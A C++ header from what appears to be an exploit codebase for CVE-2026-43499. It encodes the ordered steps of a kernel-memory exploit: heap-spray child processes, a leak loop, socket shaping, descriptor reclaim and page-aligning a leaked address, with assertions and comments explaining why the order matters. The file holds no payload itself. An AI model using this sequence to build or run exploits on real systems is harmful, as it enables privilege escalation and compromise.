#pragma once
/** @file backend/cve_2026_43499/memory/prepare_steps.hpp
 *  The order a page preparation does its work in.
 *
 *  The retired tree performed these twelve steps in this order, and the order is
 *  not decoration: which children are killed before the sockets exist, and which
 *  descriptor is closed last, are what make the reclaim drop the references the
 *  spray depends on. The sequence is therefore written down as data with a
 *  compile-time assertion, in the same spirit as the reclaim plan next to it, so a
 *  reader can see the shape and a test can pin it.
 *
 *  This file carries no geometry and no numbers beyond the order itself: how many
 *  children per group, how long to wait and how large a buffer may be are the
 *  profile's, and none of them appear here.
 */
#include <cstddef>

namespace ghostlock::backend::cve_2026_43499::memory {
    /** One step of a page preparation, in the retired tree's names. */
    enum class PrepareStep : unsigned char {
        /** Let go of whatever the previous attempt left behind. */
        Cleanup = 0,
        /** Size the groups. */
        Contexts = 1,
        /** Fork the pre-spray children and open their descriptors. */
        PreChildren = 2,
        /** Fork the spray children and open their descriptors. */
        SprayChildren = 3,
        /** Hand the address search its geometry and start it. */
        Snitch = 4,
        /** Fork the post-spray children and the leak child. */
        PostChildren = 5,
        /** Kill the children whose descriptors are not kept, all but the last post. */
        KillPartials = 6,
        /** Wait for a collision, bounded by the profile's timeout. */
        LeakLoop = 7,
        /** Open the shaping pair and send through it. */
        Shaping = 8,
        /** Pin to the owner's processor and let the scheduler settle. */
        PinAndYield = 9,
        /** Give the descriptors back in the order the reclaim plan names. */
        Reclaim = 10,
        /** Round the leaked address down to its page. */
        Align = 11,
    };

    /** The steps, in the order they happen. */
    inline constexpr PrepareStep kPrepareOrder[] = {
        PrepareStep::Cleanup,       PrepareStep::Contexts,  PrepareStep::PreChildren,
        PrepareStep::SprayChildren, PrepareStep::Snitch,    PrepareStep::PostChildren,
        PrepareStep::KillPartials,  PrepareStep::LeakLoop,  PrepareStep::Shaping,
        PrepareStep::PinAndYield,   PrepareStep::Reclaim,   PrepareStep::Align,
    };
    inline constexpr std::size_t kPrepareStepCount =
        sizeof(kPrepareOrder) / sizeof(kPrepareOrder[0]);

    /** Every step appears exactly once: a sequence that repeats a step or omits one
     *  is not the sequence the retired tree ran. */
    [[nodiscard]] constexpr bool prepare_order_is_complete() noexcept {
        for (std::size_t i = 0U; i < kPrepareStepCount; ++i) {
            std::size_t seen = 0U;
            for (std::size_t j = 0U; j < kPrepareStepCount; ++j) {
                if (kPrepareOrder[j] == kPrepareOrder[i]) {
                    ++seen;
                }
            }
            if (seen != 1U) {
                return false;
            }
        }
        return kPrepareStepCount == 12U;
    }
    static_assert(prepare_order_is_complete(),
                  "the page preparation order is twelve steps, each named once");

    /** Where a step sits in the order, for the assertions below. */
    [[nodiscard]] constexpr std::size_t step_rank(PrepareStep step) noexcept {
        for (std::size_t i = 0U; i < kPrepareStepCount; ++i) {
            if (kPrepareOrder[i] == step) {
                return i;
            }
        }
        return kPrepareStepCount;
    }
    /** The three orderings the mechanism depends on, asserted rather than
     *  commented: the sockets are shaped before the descriptors are given back, the
     *  children are killed before the wait for a collision, and the address is
     *  aligned last. */
    static_assert(step_rank(PrepareStep::KillPartials) < step_rank(PrepareStep::LeakLoop),
                  "the children are killed before waiting for a collision");
    static_assert(step_rank(PrepareStep::Shaping) < step_rank(PrepareStep::Reclaim),
                  "the shaping pair exists before descriptors are given back");
    static_assert(step_rank(PrepareStep::Reclaim) < step_rank(PrepareStep::Align),
                  "the address is aligned after the reclaim");
    static_assert(step_rank(PrepareStep::Align) + 1U == kPrepareStepCount,
                  "aligning the address is the last thing a preparation does");
}  // namespace ghostlock::backend::cve_2026_43499::memory
